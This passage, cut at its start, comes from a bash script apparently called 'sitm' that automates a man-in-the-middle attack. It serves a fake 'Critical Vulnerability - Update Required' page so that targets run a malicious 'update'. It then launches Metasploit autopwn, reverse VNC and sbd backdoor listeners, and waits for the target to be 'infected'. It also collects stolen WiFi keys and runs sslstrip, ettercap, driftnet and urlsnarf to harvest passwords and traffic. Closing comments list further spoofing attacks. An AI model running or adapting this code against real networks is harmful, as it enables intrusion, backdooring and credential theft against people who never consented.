   if [ -z "$(pgrep squid)" ]; then
      squid -f /tmp/sitm.squid # *** NEED A FIX ***
   fi
   sleep 3
   if [ -z "$(pgrep squid)" ]; then
       display error "squid failed to start" 1>&2
       if [ "$verbose" == "2" ]; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ]; then echo "killall xterm" >> $logFile; fi
       cleanUp
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ]; then
   display action "Starting: Web server"
   if [ ! -e "/etc/ssl/private/ssl-cert-snakeoil.key" ] || [ ! -e "/etc/ssl/certs/ssl-cert-snakeoil.pem" ]; then
      display error "Need to renew certificate";
      make-ssl-cert generate-default-snakeoil --force-overwrite
   fi
   action "Web Sever" "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite sitm && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" & #dissable all sites and only enable the sitm one # Don't wait, do the next command
   sleep 2
   if [ -z "$(pgrep apache2)" ]; then
      display error "Apache2 failed to start" 1>&2
      if [ "$verbose" == "2" ]; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ]; then echo "killall xterm" >> $logFile; fi
      cleanUp
   fi
   if [ "$diagnostics" == "true" ]; then
      sleep 3
      display diag "Testing: Web server"
      command=$(wget -qO- "http://$ourIP" | grep "<title>Critical Vulnerability - Update Required</title>")
      if [ ! -z "$command" ]; then
         echo "-->Web server: Okay" >> $logFile
      else
         display error "Web server: Failed" 1>&2;
         echo "-->Web server: Failed" >> $logFile
         wget -qO- "http://$ourIP" >> $logFile
      fi
   fi
fi

if [ "$payload" == "autopwn" ]; then
   display action "Auto pwn'ing"
   action "autopwn" "/opt/metasploit3/bin/msfconsole -r /tmp/sitm.rc" "true" "0|565|3" & # Don't wait, do the next command1
fi

if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
#----------------------------------------------------------------------------------------------#
   if [ "$displayMore" == "true" ]; then
      display action "Monitoring: Connections"
      action "Connections" "watch -d -n 1 \"arp -n -v -i $interface\"" "false" "0|487|5" & # Don't wait, do the next command
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "vnc" ]; then
      display action "Starting: VNC"
      action "VNC" "vncviewer -listen -encodings Tight -noraiseonbeep -bgr233 -compresslevel 7 -quality 0" "true" "0|580|3" & # Don't wait, do the next command
   elif [ "$payload" == "sbd" ]; then
      display action "Starting: SBD"
      action "SBD" "sbd -l -k g0tmi1k -p $port" "true" "0|580|10" & # Don't wait, do the next command
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
   display info "Waiting for the target to run the \"update\" file" # Wait till target is infected (It's checking for a file to be created by the metasploit script (sitm.rb))
   if [ "$diagnostics" == "true" ]; then echo "-Ready!----------------------------------" >> $logFile; echo -e "Ready @ $(date)" >> $logFile; fi
   if [ -e "/tmp/sitm.lock" ]; then rm -r "/tmp/sitm.lock"; fi
   while [ ! -e "/tmp/sitm.lock" ]; do
      sleep 5
   done

#----------------------------------------------------------------------------------------------#
   display info "Target infected!"
   if [ "$diagnostics" == "true" ]; then echo "-Target infected!------------------------" >> $logFile; fi
   targetIP=$(arp -n -v -i $interface | grep $interface | awk -F " " '{print $1}')
   if [ "$displayMore" == "true" ]; then display info "Target's IP = $targetIP"; fi; if [ "$diagnostics" == "true" ]; then echo "Target's IP = $targetIP" >> $logFile; fi

#----------------------------------------------------------------------------------------------#
   if [ "$mode" == "transparent" ]; then
      display action "Restoring: Internet access"
      action "Restoring internet" "kill dnsspoof" & # Don't wait, do the next command
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "wkv" ]; then
      if [ ! -e "/tmp/sitm.wkv" ]; then
         display error "Failed: Didn't download WiFi keys"
      else
         display action "Opening: WiFi Keys"
         action "WiFi Keys" "cat /tmp/sitm.wkv" "false" "0|565|10" "hold" & sleep 1
      fi
   fi

#----------------------------------------------------------------------------------------------#
else
   if [ "$displayMore" == "true" ]; then
      display action "Monitoring: Connections"
      action "Connections" "watch -d -n 1 \"arp -n -v -i $interface\"" "false" "0|173|7" & # Don't close! We want to view this!
      sleep 1
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$extras" == "true" ]; then
   display action "Caputuring: information from the target"
   iptables --table nat --append PREROUTING --proto tcp --destination-port 80 --jump REDIRECT --to-port 10000 #ipTables sslstrip $verbose $diagnostics
   action "SSL" "python /pentest/spoofing/sslstrip/sslstrip.py -k -f -l 10000 -w /tmp/sitm.ssl" "true" "515|0|0" & # Don't wait, do the next command
   action "Passwords" "ettercap -T -q -i $interface" "true" "515|0|10" & # Don't wait, do the next command
   #action "Passwords (2)" "dsniff -i $interface -w /tmp/sitm.dsniff" "true" "515|0|10" & # Don't wait, do the next command
   action "TCPDump" "tcpdump -i $interface -w /tmp/sitm.cap -v " "true" "515|0|5" & # Don't wait, do the next command
   action "Images" "driftnet -i $interface -d /tmp/" "true" "515|0|0" & # Don't wait, do the next command
   action "IM (MSN)" "imsniff $interface" "true" "515|155|10" & # Don't wait, do the next command
   #webspy / ettercap -P browser_plugin
   action "URLs" "urlsnarf -i $interface" "true" "515|300|10" & # Don't wait, do the next command
   sleep 1
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "normal" ] || [ "$mode" == "flip" ]; then
   display info "Ready! ...press CTRL+C to stop"
   if [ "$diagnostics" == "true" ]; then echo "-Ready!----------------------------------" >> $logFile; echo -e "Ready @ $(date)" >> $logFile; fi
   for ((;; )); do
      sleep 5
   done
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ]; then echo "-Done!---------------------------------------------------------------------------------------" >> $logFile; fi
cleanUp clean

#---Ideas--------------------------------------------------------------------------------------#
#From Local To Remote (through a gateway)
#    * ARP poisoning
#    * DNS spoofing
#    * DHCP spoofing (e.g., Spoofing the DHCP Server)* is a type of attack on DHCP server to obtain IP addresses using spoofed DHCP messages
#    * Gateway spoofing (usually, spoofing the default gateway)
#    * ICMP redirection
#    * IRDP spoofing - route mangling
#Remote
#    * DNS poisoning
#    * Route mangling
#    * Traffic tunneling

#Mode
#   normal        tcpdump & sslstrip & ettercap & wireshark & driftnet & imsniff
#   transparent
#   dead
#   flip
# Force site, spoof site, replace exe, replace images, flip images, browser pwn, smb
# fragrouter -f1
# fragrouter -B1
# Airpwn

# webmitm -d
# ssldump -r your.cap -w webmitm.crt  -d > out
